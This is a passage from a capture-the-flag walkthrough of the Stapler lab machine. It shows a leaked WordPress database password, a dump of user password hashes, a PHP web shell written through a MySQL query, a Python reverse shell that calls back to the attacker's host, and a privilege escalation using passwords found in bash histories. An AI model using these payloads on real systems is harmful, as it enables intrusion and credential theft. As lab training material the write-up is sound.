ssl._create_default_https_context = ssl._create_unverified_context
```

Once it ran successfully - I navigated to **https://192.168.1.13:12380/blogblog/wp-content/uploads/** and was presented with a .jpeg file.

<a href="/images/stapler4.png"><img src="/images/stapler4.png"></a>

All I did was save the file to my desktop, and removed the .jpeg extension. When we open to review the file we can see the following:

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');
```

Perfect! We got the root login to the MySQL Server! Let's go ahead and connect to it!

```console
root@kali:~# mysql -u root -p -h 192.168.1.13
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 98
Server version: 5.7.12-0ubuntu1 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

From here, I went ahead and tried to find the passwords in WordPress.

```console
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| loot               |
| mysql              |
| performance_schema |
| phpmyadmin         |
| proof              |
| sys                |
| wordpress          |
+--------------------+
8 rows in set (0.07 sec)

mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
11 rows in set (0.00 sec)

mysql> describe wp_users;
+---------------------+---------------------+------+-----+---------------------+----------------+
| Field               | Type                | Null | Key | Default             | Extra          |
+---------------------+---------------------+------+-----+---------------------+----------------+
| ID                  | bigint(20) unsigned | NO   | PRI | NULL                | auto_increment |
| user_login          | varchar(60)         | NO   | MUL |                     |                |
| user_pass           | varchar(64)         | NO   |     |                     |                |
| user_nicename       | varchar(50)         | NO   | MUL |                     |                |
| user_email          | varchar(100)        | NO   |     |                     |                |
| user_url            | varchar(100)        | NO   |     |                     |                |
| user_registered     | datetime            | NO   |     | 0000-00-00 00:00:00 |                |
| user_activation_key | varchar(60)         | NO   |     |                     |                |
| user_status         | int(11)             | NO   |     | 0                   |                |
| display_name        | varchar(250)        | NO   |     |                     |                |
+---------------------+---------------------+------+-----+---------------------+----------------+
10 rows in set (0.00 sec)

mysql> SELECT user_login, user_pass FROM wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
+------------+------------------------------------+
16 rows in set (0.01 sec)
```

Awesome! We got the password hashes of all the users in the blog site. If we wanted to - we could use HashCat to crack the MD5 passwords - but I will leave that out for now, as I don't need a password (since I got root in the MySQL Server).

Since I am "root" in the MySQL Server, I decided to upload a PHP Shell in the **/wp-content/uplaods/** section as **shell.php**.

```console
mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
```

Once done, we can navigate to **https://192.168.1.13:12380/blogblog/wp-content/uploads/**, and we should see our shell in there.

<a href="/images/stapler5.png"><img src="/images/stapler5.png"></a>

Once inside the shell, let's check to see if it works by typing in **?cmd=ifconfig** at the end of the url.

<a href="/images/stapler6.png"><img src="/images/stapler6.png"></a>

Perfect! Since we already have a PHP Shell in place, let's go ahead and set up a Netcat listener on our host, on port 443. This will be used for when we create our reverse shell through the PHP Shell.

```console
root@kali:~# nc -lvp 443
listening on [any] 443 ...
```

We will append the following to the end of the URL to initiate a reverse TCP Shell using Python.

```console
python%20-c%20'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.7",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

If done correctly, we should not have an established session between our host PC, and the target.

```console
192.168.1.13: inverse host lookup failed: Unknown host
connect to [192.168.1.7] from (UNKNOWN) [192.168.1.13] 52716
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@red:/var/www/https/blogblog/wp-content/uploads$ 
www-data@red:/var/www/https/blogblog/wp-content/uploads$ cd /
cd /
www-data@red:/$ ls
ls
bin   etc	      lib	  mnt	root  snap  tmp  vmlinuz.old
boot  home	      lost+found  opt	run   srv   usr
dev   initrd.img.old  media	  proc	sbin  sys   var
```

From this point, I created a small Bash script that will list all the bash_history's.

```console
www-data@red:/home$ find -name ".bash_history" -exec cat {} \;
find -name ".bash_history" -exec cat {} \;
free
ps aux
id
cat: ./peter/.bash_history: Permission denied
find: './peter/.cache': Permission denied
exit
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
whoami
www-data@red:/home$ 
```

When we look closely, we can see that there are 2 user names and passwords. The one I see come up the most is **peter**, and we also see his ssh password! So let's open up another console, and try to SSH into our target machine with peter's name and password.

```console
root@kali:~# ssh peter@192.168.1.13
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
peter@192.168.1.13's password: 
Welcome back!

red% sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: 
Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL
```

From here, I learned that peter had sudo permission from the sudoer file. This I went and changed my shell from Z to bash, and went to capturing the flag!

```console
red% sudo usermod -s /bin/bash peter
red% sudo -i
➜  ~ cd /root
➜  ~ ls
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
➜  ~ cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

## Closing:

~ TO BE ADDED~
